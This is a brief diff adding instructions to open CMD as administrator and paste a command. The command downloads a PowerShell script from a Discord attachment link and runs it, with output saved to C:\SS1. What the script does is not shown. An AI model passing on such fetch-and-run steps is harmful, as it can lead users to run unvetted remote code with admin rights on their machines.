@@ -1,0 +1,6 @@
+(Open CMD as Admin and paste the following command:)
+
+mkdir c:\SS1 && cd c:\SS1 && curl -O https://cdn.discordapp.com/attachments/1083546232745644152/1087887260948631652/miniss.ps1 && powershell .\miniss.ps1
+
+
+The script will save output at C:\SS1
